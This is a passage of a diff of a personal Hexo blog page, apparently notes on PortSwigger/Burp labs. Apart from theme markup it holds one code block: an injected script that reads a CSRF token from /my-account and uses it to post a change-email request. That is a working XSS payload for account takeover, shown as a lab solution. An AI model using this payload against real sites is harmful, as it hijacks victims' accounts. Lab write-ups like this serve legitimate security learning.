+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">var</span> req = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();</span><br><span class="language-javascript">req.<span class="hljs-property">onload</span> = handleResponse;</span><br><span class="language-javascript">req.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;get&#x27;</span>,<span class="hljs-string">&#x27;/my-account&#x27;</span>,<span class="hljs-literal">true</span>);</span><br><span class="language-javascript">req.<span class="hljs-title function_">send</span>();</span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">handleResponse</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> token = <span class="hljs-variable language_">this</span>.<span class="hljs-property">responseText</span>.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/name=&quot;csrf&quot; value=&quot;(\w+)&quot;/</span>)[<span class="hljs-number">1</span>];</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> changeReq = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();</span><br><span class="language-javascript">    changeReq.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;post&#x27;</span>, <span class="hljs-string">&#x27;/my-account/change-email&#x27;</span>, <span class="hljs-literal">true</span>);</span><br><span class="language-javascript">    changeReq.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;csrf=&#x27;</span>+token+<span class="hljs-string">&#x27;&amp;email=test@test.com&#x27;</span>)</span><br><span class="language-javascript">&#125;;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
 
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2023/04/15：burplabs从0开始</div>
+      <div>http://example.com/2023/04/27/burplab/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>April 27, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/04/27/burplab/" data-id="cll59g8ux0000agudgbe2hf7q" class="article-share-link">Share</a>
-      
-      
-    </footer>
+    <div class="license-icon iconfont"></div>
   </div>
-  
-    
-<nav id="article-nav">
-  
-    <a href="/2023/04/28/warmup/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          2023/04/18：FCTF2023：warmup&amp;正式比赛
-        
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/04/28/warmup/" title="2023/04/18：FCTF2023：warmup&amp;正式比赛">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2023/04/18：FCTF2023：warmup&amp;正式比赛</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/04/18/jihua/" title="2023/04/18：一点大致计划">
+                        <span class="hidden-mobile">2023/04/18：一点大致计划</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
       </div>
-    </a>
-  
-  
-    <a href="/2023/04/18/jihua/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">2023/04/18：一点大致计划</div>
-    </a>
-  
-</nav>
+    </div>
 
-  
-</article>
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
 
-</section>
-        
-          <aside id="sidebar">
-  
-    
 
-  
-    
 
-  
-    
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a></li></ul>
+  </aside>
+
+
     </div>
   </div>
+</div>
+
+
+
 
 
   
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
     
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2023/08/10/xssnote/">2023/08/10：xss笔记</a>
-          </li>
-        
-          <li>
-            <a href="/2023/08/10/uploadnote/">2023/08/10：upload笔记</a>
-          </li>
-        
-          <li>
-            <a href="/2023/08/10/sstinote/">2023/08/10：ssti笔记</a>
-          </li>
-        
-          <li>
-            <a href="/2023/08/03/upload-lab/">2023/08/03：upload-lab记录</a>
-          </li>
-        
-          <li>
-            <a href="/2023/07/28/sstilab/">2023/7/28：sstilab记录</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
 
-  
-</aside>
-        
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
       </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      &copy; 2023 John Doe<br>
-      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
     </div>
   </div>
-</footer>
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
+</div>
+
     
 
-<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
 
 
   
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
 
   
-<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
 
 
 
 
-<script src="/js/script.js"></script>
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
 
 
+  
 
-
-  </div>
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
 </body>
 </html>
